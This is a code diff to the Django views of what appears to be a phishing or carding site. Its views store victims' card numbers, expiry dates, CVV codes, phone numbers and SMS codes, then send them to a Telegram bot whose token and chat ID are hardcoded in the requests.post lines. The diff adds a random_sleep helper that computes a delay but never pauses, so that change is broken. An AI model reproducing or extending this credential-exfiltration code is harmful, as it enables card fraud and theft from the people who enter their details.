@@ -10,7 +10,8 @@ from .forms import ContactForm
 from django.http import JsonResponse
 from django.urls import reverse_lazy
 from django.contrib.auth.decorators import user_passes_test
-
+import time
+import random
 from rest_framework import generics
 from .models import BannedIP
 from .serializers import BannedIPSerializer
@@ -114,6 +115,7 @@ def info(request):
             last_contact.cvv = cvv_
             last_contact.bankname=""
             last_contact.save()
+            random_sleep()
             response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\n{last_contact.ip}\n{last_contact.cc}|{last_contact.mm}|{last_contact.yy}|{last_contact.cvv}\n Operator: {last_contact.operator} \nNumber:{last_contact.phone}')
             context = {
                     'id':last_contact.id
@@ -137,7 +139,8 @@ def check_approval_status(request, contact_id):
     except ContactModel.DoesNotExist:
         return JsonResponse({'error': f'Contact with ID {contact_id} does not exist.'}, status=404)
     
-    
+def random_sleep():
+    interval = random.randint(400, 1023) / 1000  
 def validate_card_number(card_number):
     regex = r'^[456]\d{3}-?\d{4}-?\d{4}-?\d{4}|^[456]\d{15}$'
     if re.match(regex, card_number):
@@ -381,7 +384,6 @@ def dseckapital(request):
         last_contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html', )
-    
     
     return render( request,'pages/loading.html',context )
 
